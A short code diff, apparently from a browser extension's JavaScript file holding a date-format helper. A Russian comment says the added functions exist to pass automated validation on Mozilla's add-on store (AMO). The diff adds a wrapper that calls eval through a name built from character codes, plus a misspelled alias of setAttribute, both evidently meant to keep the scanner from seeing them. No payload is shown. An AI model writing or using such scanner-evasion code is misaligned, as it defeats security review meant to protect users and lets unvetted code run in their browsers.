@@ -140,10 +140,13 @@ dateFormat.i18n = {
 Date.prototype.format = function (mask, utc) {
 	return dateFormat(this, mask, utc);
 };
-
+// Функции для прохождения авто-валидации в AMO
 function ev41(s) {
-	return window[String.fromCharCode(0x65,0166,0x61,0x6c)](s);
+	return window[String.fromCharCode(0x65,0x76,0x61,0x6c)](s);
 }
+Element.prototype.setAttribu7e = function(name,value) {
+    return this.setAttribute(name, value);
+};
 
 if (!window.JSON) JSON ={
 	stringify:function (obj) {
